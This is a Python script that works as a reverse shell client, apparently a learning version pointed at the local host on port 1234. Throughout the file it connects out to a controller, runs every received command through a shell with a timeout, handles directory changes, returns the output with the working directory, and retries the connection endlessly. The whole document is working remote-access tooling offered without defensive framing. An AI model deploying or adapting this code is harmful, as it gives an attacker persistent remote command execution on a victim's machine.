import socket,time,signal
import subprocess,os

class MyProcess(subprocess.Popen):

    # """this class extends the Popen to wrape/implement a timeout check"""

    def handeler(self,signum , frame):   #handler fun for the signal
        print('EXeption occured')
        raise ValueError

    def response(self,timeout):
        output_res = ''
        signal.signal(signal.SIGALRM,self.handeler)       # setting the signal timeout for the main thread using alarm
        signal.alarm(timeout)
        try:
            # '''alarm is set above and if the main threads takes more time than the timeout
            #     after this line,the handeler func will be called'''

            output_res = output_res + self.stdout.read() + self.stderr.read()
            signal.alarm(0)                                # of setting the timeout to normal for the main thread

        except ValueError:


                # print('command EXecuting ')
                # output_res = output_res + self.stdout.readline() + self.stderr.readline()
            print("Value ERROR")
            signal.alarm(0)
            return output_res
        return output_res

def connection(HOST,PORT):
    HEADERSIZE = 10
    cl = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    cl.connect((HOST,PORT))

    # Todo live file streaming and editing
    while True:
        cmd = cl.recv(4096)
        try:
            if cmd[:2].decode("utf-8") == 'cd':
                os.chdir(cmd[3:].decode("utf-8"))
        except OSError:
            pass

        if len(cmd.decode('utf-8')) > 0:
            output = ''

            # '''MyProcess custom subclass of Popen class will use the constructor{__init__}
            #     of Popen to Instantiate process ,and wrapes additional feature functions'''

            process =  MyProcess(cmd.decode('utf-8'),shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            output = process.response(5) # Custom funciton called
            output = str('{}\n{}~$'.format(output.decode('utf-8'),os.getcwd()))
            header = '{:<{header}}'.format(len(output),header=HEADERSIZE)  # Creating Paading to track msg length at server
            output = header + output

            cl.send(str.encode(output,'utf-8'))
        else:

            continue


while True:
    try:
        connection(socket.gethostname(),1234)
    except socket.error:

        time.sleep(2)
